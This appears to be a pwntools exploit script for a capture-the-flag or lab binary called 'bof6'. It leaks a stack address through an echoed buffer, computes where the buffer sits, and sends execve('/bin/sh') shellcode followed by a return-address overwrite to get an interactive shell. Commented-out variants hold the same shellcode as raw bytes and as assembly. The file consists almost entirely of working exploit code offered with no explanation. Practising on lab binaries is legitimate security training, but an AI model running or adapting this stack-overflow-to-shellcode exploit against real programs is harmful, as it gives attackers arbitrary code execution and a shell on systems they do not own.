#!/usr/bin/python3

from pwn import *

p =  process('./bof6')
exe= ELF('./bof6', checksec=False)
context.arch = 'amd64'
#input()
p.sendlineafter(b'> ', b'1')
payload=b'a'*80
p.sendafter(b'> ', payload)
p.recvuntil(payload)
leak_rbp = u64( p.recv(6) + b'\00\00')
leak_buff = leak_rbp - 544
log.info('leak_rbp: ' + hex(leak_rbp))
log.info('leak_buff: ' + hex(leak_buff))

sh = asm(shellcraft.amd64.linux.sh())
#sh = b'\x48\x31\xc0\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x89\xe7\x48\x31\xf6\x48\x31\xd2\xb0\x3b\x0f\x05'
#sh = asm(
    #"""
    #mov rbx, 29400045130965551
    #push rbx
#
    #mov rdi, rsp
    #xor rsi, rsi
    #xor rdx, rdx
    #mov rax, 0x3b
    #syscall
    #""",arch='amd64' )
#

payload=sh + b'a'*(520-len(sh)) + p64(leak_buff)
p.sendlineafter(b'> ', b'2')
p.sendafter(b'> ', payload)
p.interactive()
